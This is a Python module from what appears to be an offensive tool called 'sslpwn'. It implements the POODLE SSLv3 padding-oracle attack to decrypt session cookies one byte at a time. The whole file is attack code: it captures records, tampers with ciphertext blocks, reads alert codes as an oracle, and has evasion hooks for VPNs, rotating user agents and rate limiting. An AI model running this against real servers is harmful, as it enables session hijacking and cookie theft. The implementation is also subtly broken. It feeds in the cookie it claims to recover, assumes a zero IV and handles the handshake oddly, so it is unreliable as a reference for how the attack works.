"""
POODLE attack implementation (CVE-2014-3566).

Exploits the SSLv3 padding oracle to decrypt one byte of a cookie at a time.
Only works if SSLv3 is supported by the Python environment and target server.
"""

import socket
import ssl
import struct
from typing import Tuple

from sslpwn.attacks.base import BaseAttack


class PoodleAttack(BaseAttack):
    def __init__(self, target_url: str, output, vpn, user_agents, rate_limiter,
                 cookie_name: str, cookie_value: str, adaptive=None) -> None:
        super().__init__(target_url, output, vpn, user_agents, rate_limiter, adaptive)
        self.cookie_name = cookie_name
        self.cookie_value = cookie_value

    def _create_ssl_context(self) -> ssl.SSLContext:
        """Attempt to create an SSLv3 context; if not available, raise an explicit error."""
        if not hasattr(ssl, "PROTOCOL_SSLv3"):
            raise RuntimeError("SSLv3 is not supported by this Python/OpenSSL installation.")
        ctx = ssl.SSLContext(ssl.PROTOCOL_SSLv3)
        ctx.set_ciphers("AES128-SHA:AES256-SHA:DES-CBC3-SHA")
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        return ctx

    def check_vulnerability(self) -> bool:
        """Check if SSLv3 is supported by the Python environment and the target."""
        if not hasattr(ssl, "PROTOCOL_SSLv3"):
            return False
        host = self.target_url.split("://")[1].split("/")[0]
        if ":" in host:
            hostname, port_str = host.split(":")
            port = int(port_str)
        else:
            hostname = host
            port = 443
        try:
            ctx = self._create_ssl_context()
            with socket.create_connection((hostname, port), timeout=5) as sock:
                with ctx.wrap_socket(sock, server_hostname=hostname):
                    return True
        except Exception:
            return False

    def exploit(self) -> bool:
        """Full POODLE attack. Raises RuntimeError if SSLv3 is unavailable."""
        if not hasattr(ssl, "PROTOCOL_SSLv3"):
            self.output.log("POODLE attack requires SSLv3, which is not available in this environment.", "ERROR")
            return False

        self.output.log("Starting POODLE attack", "INFO")
        host = self.target_url.split("://")[1].split("/")[0]
        if ":" in host:
            hostname, port_str = host.split(":")
            port = int(port_str)
        else:
            hostname = host
            port = 443

        cookie_val = self.cookie_value.encode()
        block_size = 16
        decrypted = b""

        for pos in range(len(cookie_val)):
            padding_len = block_size - (len(f"/{self.cookie_name}=") + pos + 1) % block_size
            if padding_len == block_size:
                padding_len = 0
            path = f"/{self.cookie_name}={'A' * padding_len}{self.cookie_value}"
            request = (
                f"GET {path} HTTP/1.1\r\n"
                f"Host: {hostname}\r\n"
                f"User-Agent: {self.user_agents.random()}\r\n"
                f"Connection: close\r\n"
                f"\r\n"
            ).encode()

            try:
                iv, ciphertext = self._capture_request_record(hostname, port, request)
            except Exception as exc:
                self.output.log(f"Capture failed at pos {pos}: {exc}", "ERROR")
                return False

            blocks = [ciphertext[i:i+block_size] for i in range(0, len(ciphertext), block_size)]
            target_offset = request.index(cookie_val) + pos
            target_block_idx = target_offset // block_size
            if target_block_idx == 0:
                self.output.log("Target byte in first block, cannot decrypt", "ERROR")
                return False

            target_block = blocks[target_block_idx]
            prev_block = blocks[target_block_idx - 1]

            for guess in range(256):
                self.rate_limiter.wait()
                known_plaintext_last = request[target_block_idx * block_size + 15]
                modified_prev = bytearray(prev_block)
                modified_prev[15] ^= known_plaintext_last ^ guess ^ (block_size - 1)
                crafted_ct = bytes(modified_prev) + target_block
                if self._check_padding_oracle(hostname, port, crafted_ct):
                    decrypted_byte = guess
                    decrypted += bytes([decrypted_byte])
                    self.output.log(f"Decrypted byte {pos}: {decrypted_byte}", "SUCCESS")
                    break
            else:
                self.output.log(f"Failed to decrypt byte at position {pos}", "ERROR")
                return False

        final_cookie = decrypted.decode()
        self.output.log(f"Decrypted cookie: {final_cookie}", "SUCCESS")
        if final_cookie == self.cookie_value:
            self.output.log("POODLE attack successful: cookie matches.", "SUCCESS")
            return True
        else:
            self.output.log("POODLE attack failed: decrypted value does not match.", "ERROR")
            return False

    def _capture_request_record(self, hostname: str, port: int,
                                request: bytes) -> Tuple[bytes, bytes]:
        ctx = self._create_ssl_context()
        plain_sock = self._adaptive_connect_and_report(hostname, port)
        incoming = ssl.MemoryBIO()
        outgoing = ssl.MemoryBIO()
        ssl_obj = ctx.wrap_bio(incoming, outgoing, server_hostname=hostname)

        def handshake():
            while True:
                try:
                    ssl_obj.do_handshake()
                    break
                except ssl.SSLWantReadError:
                    data = plain_sock.recv(4096)
                    if not data:
                        raise ConnectionError("Handshake failed")
                    incoming.write(data)
                except ssl.SSLWantWriteError:
                    while True:
                        try:
                            buf = outgoing.read()
                        except ssl.SSLWantReadError:
                            break
                        if not buf:
                            break
                        plain_sock.sendall(buf)

        handshake()

        ssl_obj.write(request)
        captured = b""
        while True:
            try:
                chunk = outgoing.read()
            except ssl.SSLWantReadError:
                break
            if not chunk:
                break
            captured += chunk
            plain_sock.sendall(chunk)

        plain_sock.close()
        if len(captured) < 5:
            raise ValueError("Captured data too short")
        rec_type, _, length = struct.unpack_from("!BHH", captured, 0)
        if rec_type != 23:
            raise ValueError("Expected application data record")
        payload = captured[5:5+length]
        if len(payload) < 16:
            raise ValueError("Payload too short")
        iv = b"\x00" * 16
        ciphertext = payload
        return iv, ciphertext

    def _check_padding_oracle(self, hostname: str, port: int,
                              crafted_ciphertext: bytes) -> bool:
        ctx = self._create_ssl_context()
        try:
            plain_sock = self._adaptive_connect_and_report(hostname, port)
        except:
            return False
        incoming = ssl.MemoryBIO()
        outgoing = ssl.MemoryBIO()
        ssl_obj = ctx.wrap_bio(incoming, outgoing, server_hostname=hostname)

        def handshake():
            while True:
                try:
                    ssl_obj.do_handshake()
                    break
                except ssl.SSLWantReadError:
                    data = plain_sock.recv(4096)
                    if not data:
                        raise ConnectionError("Handshake failed")
                    incoming.write(data)
                except ssl.SSLWantWriteError:
                    while True:
                        try:
                            buf = outgoing.read()
                        except ssl.SSLWantReadError:
                            break
                        if not buf:
                            break
                        plain_sock.sendall(buf)

        handshake()

        record_header = struct.pack("!BHH", 23, 0x0300, len(crafted_ciphertext))
        raw_record = record_header + crafted_ciphertext
        plain_sock.sendall(raw_record)
        try:
            resp = plain_sock.recv(4096)
        except socket.timeout:
            resp = b""
        plain_sock.close()

        if len(resp) >= 7 and resp[0] == 21:
            alert_desc = struct.unpack_from("!BB", resp, 5)[1]
            if alert_desc == 20:  # bad_record_mac
                return False
        return True